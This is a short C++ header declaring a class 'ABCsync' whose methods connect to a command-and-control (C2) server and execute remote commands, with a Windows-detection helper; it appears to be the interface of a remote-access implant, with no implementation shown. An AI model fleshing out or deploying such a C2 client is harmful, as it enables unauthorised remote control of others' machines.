#ifndef ABCSYNC_H
#define ABCSYNC_H

#include <string>

class ABCsync {
public:
    bool connectToC2(const std::string& c2Address, int port);
    bool executeRemoteCommand(const std::string& command);

private:
    bool executeCommand(const std::string& command);
    bool isWindows();  // New function to detect if running on Windows
};

#endif // ABCSYNC_H
